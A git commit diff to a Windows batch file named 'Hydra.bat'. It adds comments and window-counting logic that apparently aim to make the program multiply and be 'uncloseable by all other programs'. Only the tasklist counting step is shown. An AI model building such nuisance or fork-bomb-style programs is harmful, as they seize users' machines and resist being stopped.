9ceff57d936ece5c1bd30d5bdd9ca62666b7af61
JoinRajuncraftNow <thecajunthatrages@gmail.com>
2016-02-11 12:17:53 -0500

    Update Hydra.bat

--- Hydra.bat
+++ Hydra.bat
@@ -1,11 +1,10 @@
 @ECHO OFF
 ::What if we use a text document to keep track of how many have opened, so all programs know how many to test for.
-::Can't, you would have errors since too many files are trying to access it at the same time
-::How can we communicate variables between windows?
-::Can't, unless one copies environment variables, should you not put the set n=1 above the loop?
-title Hydra
-:loop
+::Lets try the text document first. What if it created a new text document every time instead of editing the same one. 
+TITLE Hydra
 SET n=1
+::What do you mean, it is above the loop? ;)
+:loop
 ::Lets make this uncloseable by all other programs. 
 FOR /F "tokens=* USEBACKQ" %%F IN (`tasklist /FI "WINDOWTITLE eq Hydra" ^| find/c "exe"`) DO (
 SET windowcount=%%F
